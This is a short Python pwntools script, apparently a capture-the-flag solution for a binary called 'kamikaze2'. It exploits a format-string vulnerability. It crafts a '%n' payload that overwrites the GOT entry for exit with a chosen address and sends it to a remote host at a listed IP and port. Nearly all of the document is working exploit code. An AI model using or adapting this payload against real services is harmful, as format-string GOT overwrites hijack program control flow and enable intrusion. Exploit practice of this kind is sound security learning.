from pwn import *
from struct import pack

elf = ELF('./kamikaze2')
context.binary = './kamikaze2'

# FORMAT STRING VULNERABILITY!
exit_got = elf.got['exit']

target = 0x8420736

# 0x36 = 54; 0x084207 - 0x36 = 541137

payload = '%54p%13$n%541137p%14$n'.ljust(22).encode('utf-8') + p32(exit_got) + p32(exit_got+1)

# r = elf.process()
r = remote('13.53.125.206', 50000)
r.clean()
r.sendline(payload)
r.clean()
r.interactive() # Not tring to spawn any shells, Just a nice way to clear all buffer when even the clean() fails!